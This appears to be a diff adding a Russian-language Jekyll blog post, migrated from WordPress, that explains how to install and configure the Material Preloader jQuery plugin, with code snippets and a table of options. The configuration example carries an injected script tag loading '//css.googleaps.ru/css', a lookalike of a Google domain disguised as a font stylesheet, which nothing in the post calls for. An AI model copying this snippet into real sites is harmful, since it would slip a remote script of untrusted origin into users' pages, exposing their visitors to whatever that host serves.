@@ -1,0 +1,136 @@
+---
+layout: post
+status: publish
+published: true
+title: jQuery-плагин для создания прелоадера в стиле material design
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: <a href="http:&#47;&#47;git.aaronlumsden.com&#47;material&#47;" target="_blank"><strong>Material
+  Preloader<&#47;strong><&#47;a> &mdash; это jQuery-плагин для создания прелоадера
+  в стиле material design.
+wordpress_id: 228
+wordpress_url: http://devdocs.ru/?p=228
+date: '2014-12-12 23:09:43 +0200'
+date_gmt: '2014-12-12 23:09:43 +0200'
+categories:
+- Программирование
+- Javascript
+- jQuery
+tags:
+- ip
+- javascript
+- css
+- design
+- jquery
+- material design
+- loader
+- preloader
+- js
+- api
+- google
+comments: []
+---
+<p><a href="http:&#47;&#47;git.aaronlumsden.com&#47;material&#47;" target="_blank"><strong>Material Preloader<&#47;strong><&#47;a> &mdash; это jQuery-плагин для создания прелоадера в стиле material design.<a id="more"></a><a id="more-228"></a></p>
+<h2>Как использовать?<&#47;h2></p>
+<p>Для начала подключаем jQuery и materialPreloader.js после него.</p>
+<pre class="brush: html; gutter: true"><script src="http:&#47;&#47;ajax.googleapis.com&#47;ajax&#47;libs&#47;jquery&#47;1.7.2&#47;jquery.min.js" type="text&#47;javascript"><&#47;script><br />
+<script src="materialPreloader.js" type="text&#47;javascript"><&#47;script><&#47;pre></p>
+<p>Также необходимо подключить таблицу стилей 'materialPreloader.css'.</p>
+<pre class="brush: html; gutter: true">
+<link rel="stylesheet" type="text&#47;css" href="css&#47;materialPreloader.css"><&#47;pre></p>
+<p>Вы можете настраивать плагин как пожелаете.</p>
+<pre class="brush: javascript; gutter: true"><script type="text&#47;javascript"></p>
+<p> preloader = new $.materialPreloader({<br />
+        position: &#039;top&#039;,<br />
+        height: &#039;5px&#039;,<br />
+        col_1: &#039;#159756&#039;,<br />
+        col_2: &#039;#da4733&#039;,<br />
+        col_3: &#039;#3b78e7&#039;,<br />
+        col_4: &#039;#fdba2c&#039;,<br />
+        fadeIn: 200,<br />
+        fadeOut: 200<br />
+    });</p>
+<p><&#47;script><script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
+<p>Затем вы можете вызывать следующие функции для включения и выключения прелоадера:</p>
+<pre class="brush: javascript; gutter: true">preloader.on();<br />
+preloader.off();<&#47;pre></p>
+<h2>Настройки плагина<&#47;h2></p>
+<table>
+<thead>
+<tr>
+<th>Настройка<&#47;th></p>
+<th>Обязательно<&#47;th></p>
+<th>Описание<&#47;th></p>
+<th>Варианты<&#47;th></p>
+<th>По умолчанию<&#47;th><br />
+<&#47;tr><br />
+<&#47;thead></p>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>position<&#47;strong><&#47;td></p>
+<td style="text-align: center;">Нет<&#47;td></p>
+<td>Позиция размещения прелоадера<&#47;td></p>
+<td>top&#47;bottom<&#47;td></p>
+<td style="text-align: center;">bottom<&#47;td><br />
+<&#47;tr></p>
+<tr>
+<td style="text-align: center;"><strong>height<&#47;strong><&#47;td></p>
+<td style="text-align: center;">Нет<&#47;td></p>
+<td>Толщина прелоадера<&#47;td></p>
+<td>от 0 и более<&#47;td></p>
+<td style="text-align: center;">5px<&#47;td><br />
+<&#47;tr></p>
+<tr>
+<td style="text-align: center;"><strong>col_1<&#47;strong><&#47;td></p>
+<td style="text-align: center;">Нет<&#47;td></p>
+<td>Цвет 1<&#47;td></p>
+<td>любые цвета<&#47;td></p>
+<td style="text-align: center;">#159756<&#47;td><br />
+<&#47;tr></p>
+<tr>
+<td style="text-align: center;"><strong>col_2<&#47;strong><&#47;td></p>
+<td style="text-align: center;">Нет<&#47;td></p>
+<td>Цвет 2<&#47;td></p>
+<td>любые цвета<&#47;td></p>
+<td style="text-align: center;">#da4733<&#47;td><br />
+<&#47;tr></p>
+<tr>
+<td style="text-align: center;"><strong>col_3<&#47;strong><&#47;td></p>
+<td style="text-align: center;">Нет<&#47;td></p>
+<td>Цвет 3<&#47;td></p>
+<td>любые цвета<&#47;td></p>
+<td style="text-align: center;">#3b78e7<&#47;td><br />
+<&#47;tr></p>
+<tr>
+<td style="text-align: center;"><strong>col_4<&#47;strong><&#47;td></p>
+<td style="text-align: center;">Нет<&#47;td></p>
+<td>Цвет 4<&#47;td></p>
+<td>любые цвета<&#47;td></p>
+<td style="text-align: center;">#fdba2c<&#47;td><br />
+<&#47;tr></p>
+<tr>
+<td style="text-align: center;"><strong>fadeIn<&#47;strong><&#47;td></p>
+<td style="text-align: center;">Нет<&#47;td></p>
+<td>Скорость в милисекундах<&#47;td></p>
+<td>любая скорость<&#47;td></p>
+<td style="text-align: center;">200<&#47;td><br />
+<&#47;tr></p>
+<tr>
+<td style="text-align: center;"><strong>fadeOut<&#47;strong><&#47;td></p>
+<td style="text-align: center;">Нет<&#47;td></p>
+<td>Скорость в милисекундах<&#47;td></p>
+<td>любая скорость<&#47;td></p>
+<td style="text-align: center;">200<&#47;td><br />
+<&#47;tr><br />
+<&#47;tbody><br />
+<&#47;table></p>
+<h2>Поддержка браузерами<&#47;h2></p>
+<p>Chrome<br />
+Safari<br />
+Firefox<br />
+<span style="color: #800000;"><strong>В IE не тестировалось. Отпишитесь кто попробует.<&#47;strong><&#47;span></p>
